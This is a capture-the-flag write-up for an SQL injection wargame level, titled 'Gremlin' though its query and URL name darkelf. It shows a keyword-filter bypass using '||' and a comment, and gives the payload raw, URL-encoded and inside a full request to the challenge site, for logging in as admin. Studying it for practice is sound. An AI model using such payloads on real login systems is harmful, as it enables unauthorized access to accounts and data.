# SQL Injection on Gremlin Challenge

## Challenge Analysis

### Code Review
1. **PHP Code Analysis:**
    - The provided PHP code connects to a database and attempts to authenticate based on an `id` and a parameter `pw`.
    - The code includes checks to prevent certain SQL injection characters, specifically:
        - It blocks keywords like `prob`, `_`, `.`, and `()` by regex matching in the `pw` parameter.
        - It also blocks the keywords `or` and `and`, making classic injection techniques more difficult.
    - The query is executed as:
    ```sql
    select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'
    ```
    - The goal is to bypass the filters and inject SQL into the `pw` parameter to make the query return the `id` of `admin`.
2. **Objective:**
    - Our goal is to bypass the login check and retrieve the `id` of the admin user by exploiting the SQL injection vulnerability.

### Bypass Strategy
1. **Logical Operator Bypass:**
    - Since `or` and `and` are blocked, we can use the `||` operator as a logical OR alternative.

    - We can also use comments (`--` or `#`) to ignore the rest of the query.

2. **Formulating the Injection Payload:**
    - The payload should modify the query to return the `id` of `admin` regardless of the password check.
    
    - Example payload:
    ```sql
    ' || id='admin' -- 
    ```
    - This payload will make the query:
    ```sql
    select id from prob_darkelf where id='guest' and pw='' || id='admin' -- '
    ```
    - The `||` operator will evaluate to true if either `pw=''` is true or `id='admin'` is true. Since `id='admin'` is true for the admin user, the query will return the `id` of `admin`.
## Solution Steps
### Step 1: Craft the Payload
1. **Payload:**
    - The payload to bypass the login check is:
    ```sql
    ' || id='admin' -- 
    ```
    - This payload uses `||` as a logical OR and comments out the rest of the query.
2. **URL Encoding:**

    - The payload needs to be URL-encoded to be sent properly in the request:
    ```console
    %27%20%7C%7C%20id%3D%27admin%27%20--%20
    ```
### Step 2: Send the Payload
1. **Request:**
    - Append the payload to the `pw` parameter in the URL:
    ```console
    https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php?pw=%27%20%7C%7C%20id%3D%27admin%27%20--%20
    ```
2. **Response:**
    - The server will execute the modified query and return the `id` of `admin`, solving the challenge.

### Step 3: Verify the Solution
1. **Check Output:**
    - The response should display "Hello admin" and indicate that the challenge is solved.

## Conclusion
By analyzing the challenge and bypassing the filters using alternative logical operators, we successfully exploited the SQL injection vulnerability to retrieve the `id` of the admin user. This approach demonstrates how to bypass keyword filters and manipulate queries to achieve unauthorized access.

